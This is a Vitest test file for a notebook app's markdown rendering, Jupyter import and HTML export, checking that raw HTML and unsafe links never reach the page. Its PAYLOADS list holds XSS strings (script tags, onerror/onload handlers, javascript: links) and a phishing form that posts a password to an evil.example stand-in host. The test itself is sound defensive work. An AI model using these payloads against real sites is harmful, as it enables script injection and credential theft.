// @vitest-environment jsdom
import { describe, expect, it, vi } from "vitest";

// Export's chart and cell plumbing is not under test here (render.ts needs a canvas, runtime.ts Monaco).
vi.mock("../runtime", () => ({ cellSource: () => "", syncSources: () => {} }));
vi.mock("../../charts/render", () => ({ renderChartImage: () => null }));
vi.mock("../../charts/chartFeed", () => ({ computeChartOnce: async () => ({}) }));
import { escapeHtml, renderMarkdown, safeHref } from "../markdown";
import { parseIpynb } from "../ipynb";
import { toHtml, toMarkdown, type ExportCell } from "../exportNotebook";

describe("markdown cells render without running anything", () => {
  it("raw HTML is shown as text, never parsed", () => {
    const html = renderMarkdown("# Title <b>x</b>\n\n<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>");
    expect(html).not.toMatch(/<script|<img|<b>/);
    expect(html).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
    expect(html).toContain("<h1>Title &lt;b&gt;x&lt;/b&gt;</h1>");
  });
  it("only http(s) and mailto links stay links; images become their alt text (no request)", () => {
    const html = renderMarkdown("[ok](https://example.com) [bad](javascript:alert(1)) [rel](/etc/passwd) [mail](mailto:a@b.c) ![chart](https://example.com/x.png)");
    expect(html).toContain('href="https://example.com"');
    expect(html).toContain('href="mailto:a@b.c"');
    expect(html).not.toMatch(/javascript:|\/etc\/passwd"|<img/);
    expect(html).toContain("[image: chart]");
    expect(safeHref("  HTTPS://x.y ")).toBe("HTTPS://x.y");
    expect(safeHref("data:text/html,x")).toBeNull();
  });
  it("code and tables are escaped", () => {
    expect(renderMarkdown("`<i>`\n\n| a |\n|---|\n| <u>1</u> |")).not.toMatch(/<i>|<u>/);
    expect(escapeHtml(`<a href="x">'&'</a>`)).toBe("&lt;a href=&quot;x&quot;&gt;&#39;&amp;&#39;&lt;/a&gt;");
  });
});

// M4: marked's raw-block mode passed the text after <kbd>/<code>/<pre>/<script> through unescaped, and tags marked
// rejects (an `@>` attribute) stayed text, so a shared notebook could draw a live form or style sheet. Every piece of
// text is escaped now; only the elements markdown itself makes can appear.
const ALLOWED: Record<string, string[]> = {
  P: [], H1: [], H2: [], H3: [], H4: [], H5: [], H6: [], UL: [], OL: ["start"], LI: [], BLOCKQUOTE: [], PRE: [], CODE: ["class"],
  STRONG: [], EM: [], DEL: [], HR: [], BR: [], TABLE: [], THEAD: [], TBODY: [], TR: [], TH: ["align"], TD: ["align"],
  SPAN: ["class"], A: ["href", "data-q-link", "title"], INPUT: ["type", "checked", "disabled"],
};

function expectOnlyMarkdownElements(html: string) {
  const host = document.createElement("div");
  host.innerHTML = html;
  for (const el of host.querySelectorAll("*")) {
    expect(Object.keys(ALLOWED), `<${el.tagName.toLowerCase()}> from ${html}`).toContain(el.tagName);
    for (const a of el.attributes) expect(ALLOWED[el.tagName], `${el.tagName}[${a.name}] from ${html}`).toContain(a.name);
    if (el.tagName === "A") expect(el.getAttribute("href")).toMatch(/^(https?:\/\/|mailto:)/i);
    if (el.tagName === "INPUT") expect([el.getAttribute("type"), el.hasAttribute("disabled")]).toEqual(["checkbox", true]);
  }
}

const PAYLOADS = [
  "x <kbd> <form action=//evil.example/collect method=post @><input name=password type=password @><button @>Reconnect</button @></form @>",
  "x <kbd> <style @>body{display:none}</style @>",
  "<style @>body{display:none}</style @>",
  "x <code> <a href=https://evil.example/login @>Sign in again</a @>",
  "x <pre> <img src=x onerror=alert(1) @>",
  "x <script> <iframe src=https://evil.example @></iframe @>",
  "<a href=https://evil.example/login>raw link</a> and <a href=\"javascript:alert(1)\">js</a>",
  "<img src=x onerror=alert(1)> <svg onload=alert(1)> <details open ontoggle=alert(1)>",
  "<div style=\"position:fixed;inset:0\">overlay</div>\n\n<form><input></form>",
  "[a](javascript:alert(1)) [b](JaVaScRiPt:alert(1)) [c]( javascript:alert(1)) <javascript:alert(1)> [d][r] [e](data:text/html,x)\n\n[r]: javascript:alert(1)",
  "- [x] done\n- [ ] <kbd> <button @>todo</button @>\n\n| h <kbd> |\n|---|\n| <form @><input @></form @> |",
  "# <kbd> <form @>\n\n> <code> <form action=//evil.example @>\n\n**<kbd> <form @>** _<kbd> <form @>_ ~~<kbd> <form @>~~",
];

describe("markdown cells never let raw HTML reach the DOM (M4)", () => {
  it.each(PAYLOADS)("%s", (src) => {
    const html = renderMarkdown(src);
    expectOnlyMarkdownElements(html);
    expect(html).not.toMatch(/<(form|input name|button|style|iframe|img|svg|details|div|script)\b/i);
  });
  it("text stays readable: the escaped tags show as typed", () => {
    const html = renderMarkdown("x <kbd> <form action=//evil.example @>");
    expect(html).toBe("<p>x &lt;kbd&gt; &lt;form action=//evil.example @&gt;</p>\n");
    expect(renderMarkdown("Fish &amp; chips &copy; <kbd>Ctrl</kbd>")).toBe("<p>Fish &amp; chips &copy; &lt;kbd&gt;Ctrl&lt;/kbd&gt;</p>\n");
  });
  it("a .ipynb markdown cell gets the same treatment", () => {
    const r = parseIpynb(JSON.stringify({ nbformat: 4, nbformat_minor: 5, metadata: {}, cells: PAYLOADS.map((p) => ({ cell_type: "markdown", source: p.split(/(?<=\n)/) })) }));
    if (!r.ok) throw new Error(r.reason);
    expect(r.cells).toHaveLength(PAYLOADS.length);
    for (const c of r.cells) expectOnlyMarkdownElements(renderMarkdown(c.source));
  });
  it("the exported page renders markdown the same way and its CSP allows no form, base, object or frame", () => {
    const html = toHtml("t", PAYLOADS.map((source) => ({ kind: "markdown", source })));
    const body = html.slice(html.indexOf("<body>") + 6, html.indexOf("</body>"));
    expectOnlyMarkdownElements(body.replace(/<\/?section>/g, ""));
    for (const d of ["form-action 'none'", "base-uri 'none'", "object-src 'none'", "frame-src 'none'"]) expect(html).toContain(d);
  });
});

describe("Jupyter import (strict)", () => {
  const nb = (cells: unknown[], over: Record<string, unknown> = {}) => JSON.stringify({ nbformat: 4, nbformat_minor: 5, metadata: {}, cells, ...over });
  it("%%sql code cells become SQL cells without the magic line; markdown stays; the rest is skipped and counted", () => {
    const r = parseIpynb(nb([
      { cell_type: "markdown", source: ["# Sales\n", "by region"] },
      { cell_type: "code", source: ["%%sql postgresql://user:secret@db/x\n", "SELECT region, sum(total)\n", "FROM sales GROUP BY 1\n"], outputs: [{ data: "ignored" }] },
      { cell_type: "code", source: "import pandas" },
      { cell_type: "raw", source: "x" },
      { cell_type: "code", source: "  %%sql\nselect 1" },
    ]));
    if (!r.ok) throw new Error(r.reason);
    expect(r.cells.map((c) => [c.kind, c.source])).toEqual([
      ["markdown", "# Sales\nby region"],
      ["sql", "SELECT region, sum(total)\nFROM sales GROUP BY 1"],
      ["sql", "select 1"],
    ]);
    expect(r.skipped).toBe(2);
    expect(JSON.stringify(r.cells)).not.toContain("secret"); // the connection string never comes along
  });
  it("refuses other formats and bad shapes", () => {
    expect(parseIpynb("nope")).toMatchObject({ ok: false });
    expect(parseIpynb(nb([], { nbformat: 3 }))).toMatchObject({ ok: false, reason: expect.stringMatching(/format 3/) });
    expect(parseIpynb(JSON.stringify({ cells: {} }))).toMatchObject({ ok: false });
    expect(parseIpynb(nb([{ cell_type: "code", source: [1, 2] }]))).toMatchObject({ ok: false, reason: "Cell 1 has no readable source." });
    expect(parseIpynb(nb([{ source: "x" }]))).toMatchObject({ ok: false, reason: "Cell 1 is not a Jupyter cell." });
    expect(parseIpynb(nb(Array.from({ length: 2_001 }, () => ({ cell_type: "markdown", source: "" }))))).toMatchObject({ ok: false });
    expect(parseIpynb(nb([{ cell_type: "markdown", source: "x".repeat(1024 * 1024 + 1) }]))).toMatchObject({ ok: false, reason: "Cell 1 is larger than 1 MB." });
  });
});

describe("notebook export", () => {
  const cells: ExportCell[] = [
    { kind: "markdown", source: "# Report <script>x</script>" },
    { kind: "sql", source: "SELECT '```' AS fence, '<b>' AS tag", table: { columns: ["fence", "a|b"], rows: [["```", "<b>"], [null, "line\nbreak"]], rowCount: 250 }, chart: "data:image/png;base64,AAAA" },
    { kind: "sql", source: "select 1/0", error: "Divide by zero <x>" },
  ];
  it("Markdown: code fenced past any backticks, table cells escaped, row cap noted, chart inline", () => {
    const md = toMarkdown("q3", cells);
    expect(md).toContain("````sql\nSELECT '```' AS fence, '<b>' AS tag\n````");
    expect(md).toContain("| fence | a\\|b |");
    expect(md).toContain("| NULL | line break |");
    expect(md).toContain("_First 2 of 250 rows._");
    expect(md).toContain("![Chart](data:image/png;base64,AAAA)");
    expect(md).toContain("> Error: Divide by zero <x>");
  });
  it("HTML: a static page — no script, its own strict CSP, everything escaped", () => {
    const html = toHtml("q3 <evil>", cells);
    expect(html).toContain(`content="default-src 'none'; img-src data:; style-src 'unsafe-inline'; form-action 'none'; base-uri 'none'; object-src 'none'; frame-src 'none'"`);
    expect(html).not.toMatch(/<script/i);
    expect(html).toContain("<title>q3 &lt;evil&gt;</title>");
    expect(html).toContain("&lt;script&gt;x&lt;/script&gt;");
    expect(html).toContain("<td>&lt;b&gt;</td>");
    expect(html).toContain('<td class="null">NULL</td>');
    expect(html).toContain('<img alt="Chart" src="data:image/png;base64,AAAA">');
    expect(html).toContain('<div class="error">Divide by zero &lt;x&gt;</div>');
  });
});
